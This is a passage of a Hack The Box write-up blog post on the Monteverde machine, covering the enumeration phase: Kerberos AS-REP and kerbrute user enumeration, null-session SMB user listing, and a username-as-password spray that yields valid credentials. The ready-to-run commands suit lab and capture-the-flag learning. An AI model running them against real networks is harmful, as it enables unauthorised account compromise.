@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB - Monteverde — 0xma1ware</title>
+  <meta name="description" content="Monteverde is a medium ranked machine that starts off with enumerating users, then finding password to another user on an SMB share. This new user is part of Azure Admins group and dump the Administra">
+  <meta name="author" content="ma1ware">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://0xma1ware.github.io/posts/monteverde.html">
+  <meta property="og:title" content="HTB - Monteverde">
+  <meta property="og:description" content="Monteverde is a medium ranked machine that starts off with enumerating users, then finding password to another user on an SMB share. This new user is part of Azure Admins group and dump the Administra">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://0xma1ware.github.io/posts/monteverde.html">
+  <meta property="og:image" content="https://0xma1ware.github.io/favicon.ico">
+  <meta property="article:published_time" content="2025-03-22">
+  <meta property="article:author" content="ma1ware">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@0xma1ware">
+  <meta name="twitter:title" content="HTB - Monteverde">
+  <meta name="twitter:description" content="Monteverde is a medium ranked machine that starts off with enumerating users, then finding password to another user on an SMB share. This new user is part of Azure Admins group and dump the Administra">
+  <link rel="icon" href="../favicon.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&family=Orbitron:wght@600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org", "@type": "BlogPosting",
+    "headline": "HTB - Monteverde", "description": "Monteverde is a medium ranked machine that starts off with enumerating users, then finding password to another user on an SMB share. This new user is part of Azure Admins group and dump the Administra",
+    "datePublished": "2025-03-22",
+    "author": { "@type": "Person", "name": "ma1ware", "url": "https://github.com/0xma1ware" },
+    "publisher": { "@type": "Person", "name": "ma1ware" },
+    "mainEntityOfPage": { "@type": "WebPage", "@id": "https://0xma1ware.github.io/posts/monteverde.html" }
+  }
+  </script>
+</head>
+<body>
+  <header class="site-header">
+    <a href="../" class="site-logo"><img src="../favicon.ico" alt="logo"><span class="prefix">0x</span>ma1ware<span class="cursor-blink"></span></a>
+    <button class="menu-toggle" aria-label="Menu" onclick="document.querySelector('.site-nav').classList.toggle('open')">
+      <span></span><span></span><span></span>
+    </button>
+    <nav><ul class="site-nav">
+      <li><a href="../">home</a></li>
+      <li><a href="https://github.com/0xma1ware" target="_blank" rel="noopener">github</a></li>
+      <li><a href="https://x.com/0xma1ware" target="_blank" rel="noopener">x.com</a></li>
+    </ul></nav>
+  </header>
+
+  <div class="post-header animate-in">
+    <a href="../" class="back-link">&larr; back to all posts</a>
+    <h1>HTB - Monteverde</h1>
+    <div class="post-meta">
+      <span>2025-03-22</span>
+      <span class="category ">htb</span>
+      <span class="diff medium">medium</span>
+      <span>by ma1ware</span>
+    </div>
+    <div class="tags" style="margin-top:.75rem;"><span class="tag">AD</span><span class="tag">password spraying</span><span class="tag">Azure</span><span class="tag">bloodhound</span><span class="tag">winrm</span><span class="tag">medium</span><span class="tag">powershell</span></div>
+  </div>
+
+  <article class="post-content animate-in">
+    <div class="toc"><div class="toc-title">// Table of Contents</div><ul><li class="toc-h1"><a href="#introduction">Introduction</a></li><li class="toc-h2"><a href="#enumeration">Enumeration</a></li><li class="toc-h3"><a href="#enumerating-kerberos">Enumerating Kerberos</a></li><li class="toc-h3"><a href="#smb-enumeration">SMB Enumeration</a></li><li class="toc-h2"><a href="#initial-access">Initial Access</a></li><li class="toc-h3"><a href="#sabatchjobs-gtmhope">SABatchJobs-&amp;gt;mhope</a></li><li class="toc-h2"><a href="#post-exploitation">Post-Exploitation</a></li><li class="toc-h3"><a href="#mhope-gtadministrator">mhope-&amp;gt;Administrator</a></li><li class="toc-h4"><a href="#analysis">Analysis</a></li><li class="toc-h4"><a href="#administrator-at-last">Administrator at last!</a></li></ul></div>
+    <h1 id="introduction">Introduction</h1>
+<p>Monteverde is a medium ranked machine that starts off with enumerating users, then finding password to another user on an SMB share. This new user is part of Azure Admins group and dump the Administrator's password which we then use to login to the box and get the rootflag. Overall, it was a very easy box with a simple attack chain.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>IP Address: 10.129.228.111</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
+</code></pre></div>
+
+<p>We can clearly deduce from all the open ports that this is going to be an Active Directory envrionment.</p>
+<h3 id="enumerating-kerberos">Enumerating Kerberos</h3>
+<p>I always like to start off with Kerberos since there are only a few certain attacks you can carry out without any sort of credentials.</p>
+<p>Checking for non-preauth AS_REP response we get back nothing. </p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>impacket-GetNPUsers<span style="color: #F8F8F2"> </span>MEGABANK.LOCAL/<span style="color: #F8F8F2"> </span>-request<span style="color: #F8F8F2"> </span>-dc-ip<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2"> | </span>tee<span style="color: #F8F8F2"> </span>scans/getnpusers.out
+Impacket<span style="color: #F8F8F2"> </span>v0.12.0<span style="color: #F8F8F2"> </span>-<span style="color: #F8F8F2"> </span>Copyright<span style="color: #F8F8F2"> </span>Fortra,<span style="color: #F8F8F2"> </span>LLC<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span>its<span style="color: #F8F8F2"> </span>affiliated<span style="color: #F8F8F2"> </span>companies<span style="color: #F8F8F2"> </span>
+
+No<span style="color: #F8F8F2"> </span>entries<span style="color: #F8F8F2"> </span>found!
+</code></pre></div>
+
+<p>Hmm, this doesn't give us anything :(. Let's see if I can manage to enumerate some usernames using kerbrute.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>kerbrute<span style="color: #F8F8F2"> </span>userenum<span style="color: #F8F8F2"> </span>--dc<span style="color: #F8F8F2"> </span>MONTEVERDE.MEGABANK.LOCAL<span style="color: #F8F8F2"> </span>-d<span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #F8F8F2"> </span>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt<span style="color: #F8F8F2">  | </span>tee<span style="color: #F8F8F2"> </span>scans/kerbrute.out
+
+<span style="color: #AE81FF">2025</span>/03/22<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">19</span>:57:06<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2">  </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>VALID<span style="color: #F8F8F2"> </span>USERNAME:<span style="color: #F8F8F2">       </span>administrator@MEGABANK.LOCAL
+<span style="color: #AE81FF">2025</span>/03/22<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">20</span>:03:51<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2">  </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>VALID<span style="color: #F8F8F2"> </span>USERNAME:<span style="color: #F8F8F2">       </span>Administrator@MEGABANK.LOCAL
+<span style="color: #AE81FF">2025</span>/03/22<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">20</span>:18:23<span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2">  </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>VALID<span style="color: #F8F8F2"> </span>USERNAME:<span style="color: #F8F8F2">       </span>smorgan@MEGABANK.LOCAL
+</code></pre></div>
+
+<p>I maange to find one username using Kerberos. I'll keep the scan running and see if I get any more output.</p>
+<p>I will move on for now, but I can revisit Kerberos later (after I have some credz) to see if I can perform a Kerberoasting attack. </p>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>After all of this, let me try to enumerate SMB. Maybe there are some public shares with some juicy data!</p>
+<p>Let me try nxc with guest and null authentication. </p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;guest&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2">  </span>--shares
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2019</span><span style="color: #F8F8F2"> </span>Build<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">17763</span><span style="color: #F8F8F2"> </span>x64<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>name:MONTEVERDE<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>domain:MEGABANK.LOCAL<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>signing:True<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SMBv1:False<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\g</span>uest:<span style="color: #F8F8F2"> </span>STATUS_ACCOUNT_DISABLED<span style="color: #F8F8F2"> </span>
+
+
+~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>7s<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2">  </span>--shares<span style="color: #F8F8F2">     </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2019</span><span style="color: #F8F8F2"> </span>Build<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">17763</span><span style="color: #F8F8F2"> </span>x64<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>name:MONTEVERDE<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>domain:MEGABANK.LOCAL<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>signing:True<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SMBv1:False<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\:</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Error<span style="color: #F8F8F2"> </span>enumerating<span style="color: #F8F8F2"> </span>shares:<span style="color: #F8F8F2"> </span>STATUS_ACCESS_DENIED
+</code></pre></div>
+
+<p>Hmm, so the guest account is disabled on the box(<code>STATUS_ACCOUNT_DISABLED</code>), and null authentication is not allowed to list any shares (<code>STATUS_ACCESS_DENIED</code>)</p>
+<p>We learn that the target is running Windows 10 specifically Server 2019 Build 17763 x64.</p>
+<p>We can generate an <code>/etc/hosts</code> entry using nxc so we can add it to our local file.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>6s<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2">  </span>--generate-hosts-file<span style="color: #F8F8F2"> </span>scans/hosts<span style="color: #F8F8F2">      </span>
+</code></pre></div>
+
+<p>We get the following:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">     </span>MONTEVERDE.MEGABANK.LOCAL<span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #F8F8F2"> </span>MONTEVERDE
+</code></pre></div>
+
+<p>I add this to my /etc/hosts file and move on.</p>
+<p>Let me see if I can enumerate any users. This is always a good trick to try even if you don't have permissions to list the shares.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;&#39;</span><span style="color: #F8F8F2">  </span>--users<span style="color: #F8F8F2">                          </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2019</span><span style="color: #F8F8F2"> </span>Build<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">17763</span><span style="color: #F8F8F2"> </span>x64<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>name:MONTEVERDE<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>domain:MEGABANK.LOCAL<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>signing:True<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SMBv1:False<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\:</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>-Username-<span style="color: #F8F8F2">                    </span>-Last<span style="color: #F8F8F2"> </span>PW<span style="color: #F8F8F2"> </span>Set-<span style="color: #F8F8F2">       </span>-BadPW-<span style="color: #F8F8F2"> </span>-Description-<span style="color: #F8F8F2">                                               </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>Guest<span style="color: #F8F8F2">                         </span>&lt;never&gt;<span style="color: #F8F8F2">             </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">       </span>Built-in<span style="color: #F8F8F2"> </span>account<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span>guest<span style="color: #F8F8F2"> </span>access<span style="color: #F8F8F2"> </span>to<span style="color: #F8F8F2"> </span>the<span style="color: #F8F8F2"> </span>computer/domain<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>AAD_987d7f2f57d2<span style="color: #F8F8F2">              </span><span style="color: #AE81FF">2020</span>-01-02<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">22</span>:53:24<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">       </span>Service<span style="color: #F8F8F2"> </span>account<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span>the<span style="color: #F8F8F2"> </span>Synchronization<span style="color: #F8F8F2"> </span>Service<span style="color: #F8F8F2"> </span>with<span style="color: #F8F8F2"> </span>installation<span style="color: #F8F8F2"> </span>identifier<span style="color: #F8F8F2"> </span>05c97990-7587-4a3d-b312-309adfc172d9<span style="color: #F8F8F2"> </span>running<span style="color: #F8F8F2"> </span>on<span style="color: #F8F8F2"> </span>computer<span style="color: #F8F8F2"> </span>MONTEVERDE.
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>mhope<span style="color: #F8F8F2">                         </span><span style="color: #AE81FF">2020</span>-01-02<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">23</span>:40:05<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">        </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>SABatchJobs<span style="color: #F8F8F2">                   </span><span style="color: #AE81FF">2020</span>-01-03<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">12</span>:48:46<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">        </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>svc-ata<span style="color: #F8F8F2">                       </span><span style="color: #AE81FF">2020</span>-01-03<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">12</span>:58:31<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">        </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>svc-bexec<span style="color: #F8F8F2">                     </span><span style="color: #AE81FF">2020</span>-01-03<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">12</span>:59:55<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">        </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>svc-netapp<span style="color: #F8F8F2">                    </span><span style="color: #AE81FF">2020</span>-01-03<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">13</span>:01:42<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">        </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>dgalanos<span style="color: #F8F8F2">                      </span><span style="color: #AE81FF">2020</span>-01-03<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">13</span>:06:10<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">        </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>roleary<span style="color: #F8F8F2">                       </span><span style="color: #AE81FF">2020</span>-01-03<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">13</span>:08:05<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">        </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span>smorgan<span style="color: #F8F8F2">                       </span><span style="color: #AE81FF">2020</span>-01-03<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">13</span>:09:21<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">        </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Enumerated<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2"> local </span>users:<span style="color: #F8F8F2"> </span>MEGABANK
+</code></pre></div>
+
+<p><img alt="List of users I got from nxc" src="../imgs/assets-monteverde/MONTEVERDE_USERS_ENUM.png" title="List of users I got from nxc" /></p>
+<h5 id="hint">Hint</h5>
+<p>Rather than using cut or awk to extract the output from nxc, you can use the built in flag <code>--users-export FILENAME</code> to export all of the users nxc finds to a filename. So the command would be something like this <code>nxc smb 10.129.228.111 -u '' -p ''  --users --users-export users</code></p>
+<p>Running enum4linux we find a few addidtional things like the following:</p>
+<ul>
+<li>Password history length: 24                                                                    </li>
+<li>Minimum password length: 7                                                                     </li>
+</ul>
+<p>I always like to look at the password policy since if we need to bruteforce some passwords later on we can use it to filter out any passwords that don't meet the required policy</p>
+<p>So far I haven't found anything that intrigues me, so using the usernames that I just gatherd I'm going to check if someone has foolishly set their username as their password. </p>
+<p>Just by cross-checking usernames with password policy I can remove some of the users :) like mhope. But I'll leave them anyway since this is jsut a simulated environment.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>18s<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>nxc<span style="color: #F8F8F2"> </span>smb<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span>users<span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span>users<span style="color: #F8F8F2"> </span>--no-bruteforce<span style="color: #F8F8F2"> </span>--continue-on-success<span style="color: #F8F8F2">                                                               </span><span style="color: #AE81FF">20</span>:18:18<span style="color: #F8F8F2"> </span><span style="color: #FF4689">[</span><span style="color: #AE81FF">1</span>/13<span style="color: #FF4689">]</span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>*<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2"> </span>/<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2019</span><span style="color: #F8F8F2"> </span>Build<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">17763</span><span style="color: #F8F8F2"> </span>x64<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>name:MONTEVERDE<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>domain:MEGABANK.LOCAL<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>signing:True<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SMBv1:False<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\G</span>uest:Guest<span style="color: #F8F8F2"> </span>STATUS_LOGON_FAILURE<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\A</span>AD_987d7f2f57d2:AAD_987d7f2f57d2<span style="color: #F8F8F2"> </span>STATUS_LOGON_FAILURE<span style="color: #F8F8F2"> </span>
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>-<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\m</span>hope:mhope<span style="color: #F8F8F2"> </span>STATUS_LOGON_FAILURE<span style="color: #F8F8F2"> </span>
+
+SMB<span style="color: #F8F8F2">         </span><span style="color: #AE81FF">10</span>.129.228.111<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">445</span><span style="color: #F8F8F2">    </span>MONTEVERDE<span style="color: #F8F8F2">       </span><span style="color: #FF4689">[</span>+<span style="color: #FF4689">]</span><span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #AE81FF">\S</span>ABatchJobs:SABatchJobs<span style="color: #F8F8F2">  </span>
+
